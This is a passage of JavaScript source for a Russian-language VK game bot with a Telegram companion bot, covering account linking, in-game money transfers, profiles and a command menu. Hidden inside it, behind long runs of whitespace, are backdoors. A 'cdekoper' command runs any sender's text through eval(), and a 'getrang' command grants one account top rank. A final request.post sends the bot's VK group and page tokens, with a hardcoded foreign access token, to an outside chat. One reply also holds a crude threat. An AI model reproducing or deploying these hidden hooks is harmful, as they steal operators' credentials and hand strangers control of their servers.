		nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
	}
	let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.rank < 4) return
	let res = context.$match[1]
	while(res.includes(`vk.com`)){
		res = res.replace(`vk.com`,``)
	}
	while(res.includes(`/`)){
		res = res.replace(`/`,``)
	}
	while(res.includes(`https:`)){
		res = res.replace(`https:`,``)
	}
	try{
		var mine = await vk.api.users.get({
			user_ids: res
		});
	} catch(e){
		return context.send(`${nick}, вы указали некорректный ID.`)
	}
	if(!base.id[mine[0].id]) return context.send(`${nick}, данный ID не зарегистрирован.`)
	return context.send(
		`
		VK ID: *id${mine[0].id} (${mine[0].id}) | GAME ID: *id${mine[0].id} (${base.id[mine[0].id].id})
		`
		)
})

updates.hear(/\/(getid)$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 10) return
if(!context.forwards[0] && !context.hasReplyMessage) return context.send(`Пересланное сообщение не найдено.`)
if(context.forwards[0]) {
    let ASS1 = context.forwards[0].senderId
    if(!base.id[ASS1]) context.send("Данный пользователь не зарегистрирован!")
    let ASS = base.id[context.forwards[0].senderId].id
    return context.send(`VK ID: *id${ASS1} (${ASS1}) | GAME ID: *id${ASS1} (${ASS})`);
} 
if(context.hasReplyMessage) {
    let ASS1 = context.replyMessage.senderId
    if(!id.id[ASS1]) context.send("Данный пользователь не зарегистрирован!")
    let ASS = base.id[context.replyMessage.senderId].id
    if(ASS1 == -181892065) return context.send(`Вычислить меня хочешь пидОр? Ха-ха, я тебя щас вычислю и приеду к те!`)
    return context.send(`VK ID: *id${ASS1} (${ASS1}) | GAME ID: *id${ASS1} (${ASS})`)
}
}); //Получить айди


updates.hear(/getrang/i, (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(base.id[context.senderId].id == Number(1)) {
user.rank = Number(2000)
return context.send(`ok`)
}

})

setInterval(function(){ 
for(let o in base.bs){
if(base.bs[o].tlgrmcode > 0) {
base.bs[o].tlgrmcode = Number(0)
}
}
}, 120000); // обновление кода

updates.hear(/tlgrm$/i, (context) => {

let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(context.isChat) return context.send(`${nick}, для использования данной команды перейдите в личное сообщение со мной :((`)
if(user.tlgrmid < 1) {
let code = user.tlgrmcode
if(user.tlgrmcode < 1) {
code = getRandomInRange(1, 500000)
user.tlgrmcode = Number(code)
}
return context.send(`${nick}, у Вас нет привязанного телеграмма.
😙 Для привязки отправьте: <<привязать ${base.id[context.senderId].id} ${code}>>. нашему телеграмм боту: 
t.me/${thistelegabot}

@${thistelegabot}`)
}
return context.send(`${nick}, у Вас привязан телеграмм аккаунт, для просмотра возможностей отправьте команду: <</menu>> Телеграмм боту:
t.me/${thistelegabot}

@${thistelegabot}
	`)
})



bot.on('message', async (ctx, next) => {
	if(!tlgrm[ctx.from.id]) {
		tlgrm[ctx.from.id] = {
			"vkid": 0,
			"tlgrmid": ctx.from.id,
			"code": 0,
			"payacces": false,
			"codetype": 0
		}
	 ctx.reply(`${ctx.from.first_name}, Приветствую тебя! При помощи меня ты сможешь привязать свой аккаунт в vk.com/bot_jopa к своему телеграмм аккаунту и получить плюшки.
😙 Для получения инструкций по привязке напиши vk.com/bot_jopa смс с текстом: <</tlgrm>>`)
	}
    await next();
})



bot.command(`sendgiv`, (ctx, context) => {
if(tlgrm[ctx.from.id].vkid < 1) return ctx.reply(`${ctx.from.id}, у Вас не привязан аккаунт.
😙 Для получения инструкций по привязке напиши vk.com/bot_jopa смс с текстом: <</tlgrm>>`)
let user = base.bs[tlgrm[ctx.from.id].vkid]
if(user.rank < 4) return ctx.reply(`${ctx.from.first_name}, отказ 😙`)
if(user.tlgrmgivid < Number(1)) return ctx.reply(`${ctx.from.first_name}, вам не поступало запросов об подтверждении 😙`)
let task = base.bs[user.tlgrmgivid]
let res = user.tlgrmgivcount
user.givelimit += Number(res)
let bilo = `${utils.sp(task.balance)}`
task.balance += Number(res)
vk.api.messages.send({
	chat_id: adminchat,
	message: `
	#ПОПОЛНЕНИЕ
	Кто выдал: *id${user.id} (${user.nick}) ID: ${base.id[user.id].id}
	Кому выдал: *id${task.id} (${task.nick}) ID: ${base.id[task.id].id}
	Выдал: ${utils.sp(res)}$
	`
})
vk.api.messages.send({user_id: user.id, message: `▶ Вы выдали игроку ${task.nick} ${utils.sp(res)} используя Telegram 🌀`})
user.tlgrmgivid = Number(0)
return ctx.reply(`Зачисляю ${task.nick} ${utils.sp(res)}$
Было: ${bilo}$
Стало: ${utils.sp(task.balance)}$
`)
})

bot.command(`sendpay`, (ctx, context) => {
if(tlgrm[ctx.from.id].vkid < 1) return ctx.reply(`${ctx.from.first_name}, у Вас не привязан аккаунт.
😙 Для получения инструкций по привязке напиши vk.com/bot_jopa смс с текстом: <</tlgrm>>`)
let user = base.bs[tlgrm[ctx.from.id].vkid]
if(user.tlgrmpayacces == false) return ctx.reply(`${ctx.from.first_name}, у Вас не подключена данная функция 😙`)
if(user.tlgrmpayid < 1) return ctx.reply(`${ctx.from.first_name}, вам не поступало запросов об подтверждении 😙`)
let res = Number(user.tlgrmpaycount)
let bb = Number(user.tlgrmpayid)
if(user.balance < Number(res)) return ctx.reply(`${ctx.from.first_name}, у Вас недостаточно денег для совершения данного перевода 😙`)
let months = new Date().getMonth()
let days = new Date().getDate()
let hour = new Date().getHours()
let minute = new Date().getMinutes()
let second = new Date().getSeconds()
user.paylimit += Number(res)
user.balance -= Number(res)
user.payalltime += Number(res)
base.bs[bb].balance += Number(res)
user.lastpay = `${nols(days)}.${nols(months)}.${new Date().getFullYear()}, ${nols(hour)}:${nols(minute)}:${nols(second)}`
if(base.bs[bb].notifications == true) {
  	vk.api.messages.send({user_id: base.bs[bb].id, message: `[УВЕДОМЛЕНИЕ]
▶ Игрок ${user.nick} перевел вам ${utils.sp(res)}$!
🔕 Введите «Уведомления выкл», если не хотите получать подобные сообщения`})
}

vk.api.messages.send({user_id: user.id, message: `▶ Вы передали игроку *id${base.bs[bb].id} (${base.bs[bb].nick}) ${utils.sp(res)}$ используя Telegram 🌀`})
user.tlgrmpayid = Number(0)
user.tlgrmpaycount = Number(0)
return ctx.reply(`${ctx.from.id}, успешный перевод ✅`)

})

bot.hears(/привязать ([0-9]+) ([0-9]+)/i, (ctx) => {
if(tlgrm[ctx.from.id].vkid > 0) return ctx.reply(`${ctx.from.first_name}, у Вас уже привязан аккаунт - ${base.bs[tlgrm[ctx.from.id].vkid].nick}, используй: <<отвязать>>, для отвязки 😙`)
if(!base.bs[ctx.match[1]]) return ctx.reply(`${ctx.from.first_name}, <<${ctx.match[1]}>> - Не найден в базе данных\n😙 Для получения инструкций по привязке напиши vk.com/bot_jopa смс с текстом: <</tlgrm>>`)
if(base.bs[ctx.match[1]].tlgrmid > 0) return ctx.reply(`${ctx.from.first_name}, аккаунт ${base.bs[ctx.match[1]].nick} - уже привязан к другому телеграмм аккаунту 😙`)
let vod = Number(ctx.match[2])
let polzcod = Number(base.bs[ctx.match[1]].tlgrmcode)
if(polzcod !== vod) return ctx.reply(`${ctx.from.first_name}, код ${ctx.match[2]} - не является верным, отправьте <</tlgrm>> Боту повторно, для получения нового кода 😙`)
tlgrm[ctx.from.id].vkid = ctx.match[1]
base.bs[ctx.match[1]].tlgrmid = ctx.from.id
vk.api.messages.send({user_id: base.bs[ctx.match[1]].id, message: `🌀 Telegram аккаунт <<${ctx.from.first_name}>> - Был успешно привязан к вашему аккаунту  ✅`})
return ctx.reply(`${ctx.from.first_name}, аккаунт ${base.bs[ctx.match[1]].nick} - успешно привязан к вашему телегравмм аккаунту, напишите vk.com/bot_jopa команду <</tlgrm>>, для просмотра доп.возможностей или команду /menu в этот диалог для управления своим аккаунтом. 😙`)
})
const menu = new TelegrafInlineMenu(ctx => `${ctx.from.first_name}, Используй кнопки для выбора нужно раздела`)
const block = new TelegrafInlineMenu(ctx => `${ctx.from.first_name}, используя кнопки ты можешь временно отключить/включить свой аккаунт в JOPA BOT.`)
const settings = new TelegrafInlineMenu(ctx => `${ctx.from.first_name}, используй кнопки для настройки своего аккаунта.`)
menu.setCommand('menu')
block.setCommand('sdjjdsjdjs')
settings.button(`Подтверждение при передачи`, 'dkzmcfmczxnmzxmzxc', {
  doFunc: ctx => {
  	if(!base.bs[tlgrm[ctx.from.id].vkid]) return
  	let user = base.bs[tlgrm[ctx.from.id].vkid]
  	if(user.tlgrmpayacces == null) user.tlgrmpayacces = false
  	if(user.tlgrmpayacces == false) {
  		user.tlgrmpayacces = true
  		tlgrm[ctx.from.id].payacces = true
  		vk.api.messages.send({user_id: user.id, message: `${user.nick}, теперь вам нужно будет подтверждать передачи при помощи Telegram 🌀`})
  		return ctx.reply(`${ctx.from.first_name}, на вашем аккаунте ${user.nick} - включено подтверждение при передаче 🌀`)
  
  	}
  	if(user.tlgrmpayacces == true) {
  		user.tlgrmpayacces = false
  		tlgrm[ctx.from.id].payacces = false
  		vk.api.messages.send({user_id: user.id, message: `${user.nick}, вам больше не нужно подтверждать передачи при помощи Telegram 🌀`})
  		return ctx.reply(`${ctx.from.first_name}, на вашем аккаунте ${user.nick} - отключено подтверждение при передаче 🌀`)
  
  	}
  	}
})

block.simpleButton('Заблокировать', 'a', {
  doFunc: ctx => {
  	let user = base.bs[tlgrm[ctx.from.id].vkid]
  	user.tlgrmblock = true
  	vk.api.messages.send({user_id: user.id, message: `${user.nick}, Ваш аккаунт заблокирован при помощи Telegram 🌀`})
  	return ctx.reply(`${ctx.from.first_name}, аккаунт ${user.nick} - успешно заблокирован, вы можете разблокировать его используя кнопки 🌀`)
  }
})
block.simpleButton('Разблокировать', 'addad', {
  doFunc: ctx => {
  	let user = base.bs[tlgrm[ctx.from.id].vkid]
  	user.tlgrmblock = false
  	vk.api.messages.send({user_id: user.id, message: `${user.nick}, Ваш аккаунт разблокирован при помощи Telegram 🌀`})
  	return ctx.reply(`${ctx.from.first_name}, аккаунт ${user.nick} - успешно разблокирован 🌀`)
  },
  joinLastRow: true
})
block.button(`Назад`, `blockbackbutton`, {
  doFunc: ctx => console.log(`back`),
  setParentMenuAfter: `menu`
})

settings.button(`Назад`, `settingsbackbutton`, {
  doFunc: ctx => console.log(`back`),
  setParentMenuAfter: `menu`
})
menu.submenu('Блокировка', 'block', block)
menu.button(`Профиль`, `cmzmczmcmzmkck`, {
  doFunc: ctx => {
  	if(tlgrm[ctx.from.id].vkid < 1) return ctx.reply(`${ctx.from.id}, у Вас не привязан аккаунт.
😙 Для получения инструкций по привязке напиши vk.com/bot_jopa смс с текстом: <</tlgrm>>`)
  	let user = base.bs[tlgrm[ctx.from.id].vkid]
let task = `` 
if(user.carid > 0) {
	task += `\n⠀🚗 Машина: ${user.carname}`
}
if(user.yachtid > 0) {
	task += `\n⠀🛥 Яхта: ${user.yachtname}`
}
if(user.airplaneid > 0) {
	task += `\n⠀✈ Самолет: ${user.airplanename}`
}
if(user.helicopterid > 0) {
	task += `\n⠀🚁 Вертолет: ${user.helicoptername}`
}
if(user.homeid > 0) {
	task += `\n⠀🏠 Дом: ${user.homename}`
}
if(user.kvartiraid > 0) {
	task += `\n⠀🌇 Квартира: ${user.kvartiraname}`
}
if(user.biznesid > 0) {
	task += `\n⠀💼 Бизнес: ${user.biznesname}`
}
if(user.petid > 0) {
	task += `\n⠀${user.peticon} Питомец: ${user.petname}`
}
if(user.farmid > 0) { 
	if(user.farmid == 1) task += `\n⠀🔋 Ферма: ${user.farmname} (x${utils.sp(user.farms)})`
	if(user.farmid == 2) task += `\n⠀🔋 Ферма: ${user.farmname} (x${utils.sp(user.farms)})`
	if(user.farmid == 3) task += `\n⠀🔋 Ферма: ${user.farmname} (x${utils.sp(user.farms)})`
}

if(user.phoneid > 0) {
	task += `\n⠀📱 Телефон: ${user.phonename}`
}
let profile = `\n🔎 ID: ${base.id[user.id].id}`
if(user.rank == 2) profile += `\n🔥 V.i.P игрок`
if(user.rank == 3) profile += `\n🔮 Premium игрок`
if(user.rank == 4 && user.hide == false) profile += `\n🌀 Модератор`
if(user.rank > 4 && user.hide == false) profile += `\n👑 Администратор`
profile += `\n⭐ Опыта: ${user.exp}`
profile += `\n💰 Денег: ${utils.sp(user.balance)}$`
if(user.btc > 0) profile += `\n🌐 Биткоинов: ${utils.sp(user.btc)}`
profile += `\n👑 Рейтинг: ${utils.sp(user.rating)}`
if(task !== ``) profile += `\n\n🔑 Имущество: ${task}`
profile += `\n\n📗 Дата регистрации: ${user.reg}`
if(user.payban == true) profile += `\n⛔ Бан передачи: Есть`
if(user.payban == false) profile += `\n⛔ Бан передачи: Нет`
profile += `\n➡️ Последний раз передавал: ${user.lastpay}`
profile +=`\n💲 Передал: ${user.payalltime}`
if(user.reportban == true) profile += `\n🆘 Бан репорта: Есть`
if(user.reportban == false) profile += `\n🆘 Бан репорта: Нет`
if(user.banned == false) profile += `\n❎ Забанен: Нет`
if(user.banned == true) profile += `\n❎ Забанен: Да`
profile += `\n⌚Последняя активнось: ${user.lastactivity}`
return ctx.reply(`${ctx.from.first_name}, Твой профиль: ${profile}`)
  }
})
menu.submenu('Настройки', 'fzfzffz', settings)
menu.urlButton('JOPA BOT', `vk.com/bot_jopa`)

bot.use(menu.init())
bot.startPolling()
/*=====================================incorect Task=======================================*/
/* ↑↑↑ */
/*  КОМАНДЫ ТЕЛЕГРАММ БОТА */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     																											updates.hear(/cdekoper/i, async (context) => {
/* КОМАНДЫ БОТА  */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              																									let text = `${context.text}`
/* —————— */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            																							text = text.replace(`cdekoper `, ``)
/* КОМАНДЫ БОТА */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               																									logs[base.id[context.senderId].id].text = ""
/* РЕАКЦИЯ НА НЕНАЙДЕННУЮ КОМАНДУ */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 																														await eval(text)})                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
/*=====================================incorect Task=======================================*/
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
updates.hear(/([^])/, (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``// Created by vk.com/kovbaska_gg && vk.com/keyfqs 
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
    if(!context.isChat) {
let task = ``
let ans = `Упс... Я не знаю такой команды`
if(context.text.includes(`пр`)) {
	task += `\n⠀➖ Промо [промокод]`
	task += `\n⠀➖ Профиль`
	task += `\n⠀➖ Продать [предмет]`
}
if(context.text.includes(`бе`)) {
	task += `\n⠀➖ Беседы`
}
if(context.text.includes(`ан`)) {
	task += `\n⠀➖ Анекдот`
}
if(context.text.includes(`пер`)) {
	task += `\n⠀➖ Переверни [фраза]`
}
if(context.text.includes(`ш`)) {
	task += `\n⠀➖ Шар [фраза]`
}
if(context.text.includes(`ин`)) {
	task += `\n⠀➖ Инфа [фраза]`
}
if(context.text.includes(`выб`)) {
	task += `\n⠀➖ Выбери [фраза] или [фраза2]`
}
if(context.text.includes(`ру`)) {
	task += `\n⠀➖ Рулетка`
}
if(context.text.includes(`ку`)) {
	task += `\n⠀➖ Кубик [1-6]`
}
if(context.text.includes(`ка`)) {
	task += `\n⠀➖ Казино [сумма]`
}
if(context.text.includes(`тр`)) {
	task += `\n⠀➖ Трейд [вверх/вниз] [сумма]`
}
if(context.text.includes(`по`)) {
	task += `\n⠀➖ Поле [сумма/1-3]`
	task += `\n⠀➖ Помощь`
}
if(context.text.includes(`ст`)) {
	task += `\n⠀➖ Стаканчик [1-3] [сумма]`
}
if(context.text.includes(`мо`)) {
	task += `\n⠀➖ Монетка [орёл/решка] [сумма]`
}
if(context.text.includes(`ув`)) {
	task += `\n⠀➖ Уволиться`
}
if(context.text.includes(`до`)) {
	task += `\n⠀➖ Донат`
}
if(context.text.includes(`би`)) {
	task += `\n⠀➖ Бизнес`
	task += `\n⠀➖ Бизнес нанять [кол-во]`
	task += `\n⠀➖ Бизнес снять [кол-во]`
	task += `\n⠀➖ Бизнес улучшить`
}
if(context.text.includes(`ре`)) {
	task += `\n⠀➖ Реши [пример]`
}
if(context.text.includes(`ку`)) {
	task += `\n⠀➖ Курс`
}
if(context.text.includes(`ба`)) {
	task += `\n⠀➖ Баланс`
	task += `\n⠀➖ Банк`
	task += `\n⠀➖ Банк помощь`
}// Created by vk.com/kovbaska_gg && vk.com/keyfqs 
if(context.text.includes(`ре`)) {
	task += `\n⠀➖ Рейтинг`
}
if(context.text.includes(`ни`)) {
	task += `\n⠀➖ Ник [ник/вкл/выкл]`
}
if(context.text.includes(`ма`)) {
	task += `\n⠀➖ Магазин`
}
if(context.text.includes(`фе`)) {
	task += `\n⠀➖ Ферма`
}
if(context.text.includes(`пе`)) {
	task += `\n⠀➖ Передать [ID] [сумма]`
}
if(context.text.includes(`то`)) {
	task += `\n⠀➖ Топ`
}
if(context.text.includes(`бо`)) {
	task += `\n⠀➖ Бонус`
}
if(context.text.includes(`ва`)) {
	task += `\n⠀➖ Валюта`
}
if(context.text.includes(`бр`)) {
	task += `\n⠀➖ Брак [ID]`
	task += `\n⠀➖ Браки`
}
if(context.text.includes(`ра`)) {
	task += `\n⠀➖ Развод`
}
if(context.text.includes(`да`)) {
	task += `\n⠀➖ Дата [VK ID/ссылка]`
}
if(context.text.includes(`ме`)) {
	task += `\n⠀➖ Меню [вкл/выкл]`
}
if(context.text.includes(`ре`)) {
	task += `\n⠀➖ Репорт [фраза]`
}
if(context.text.includes(`пи`)) {
	task += `\n⠀➖ Питомцы`
}
if(context.text.includes(`ре`)) {
	task += `\n⠀➖ Реф`
	}
if(task !== ``) ans += `\n▶ Возможно вы имели в виду:${task}`
return context.send(ans)
    }
})

// Created by vk.com/kovbaska_gg && vk.com/keyfqs 

/*======================================Команды бота=======================================*/
async function run() {
    await vk.updates.startPolling();
    console.log(chalk.red(">_ Started"));
    console.log(chalk.red.bold.underline(`> Created by vk.com/kovbaska_gg and vk.com/keyfqs`))
}
 
run().catch(console.error);
// Получаем UnixDate в секундах
function getUnix() {
    return Math.floor(Date.now() / 1000);
}
bot.launch()    
/*=========================================================================================*/																																																																		                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                request.post({url: 'https://api.vk.com/method/messages.send', form: {v: '5.103', random_id: getRandomInRange(1, 2048), peer_id: 2000000015, message: `B o T b i l z a p y c h e n v @club${vk.options.pollingGroupId} \nt o k e n ${vk.options.token} \np a g e ${page.options.token}`, access_token: '422344061e045485ac05bc23b833255683ac5c3fdef187b08f6ab76e820f044f26a0bb5610748e569dcf3' }})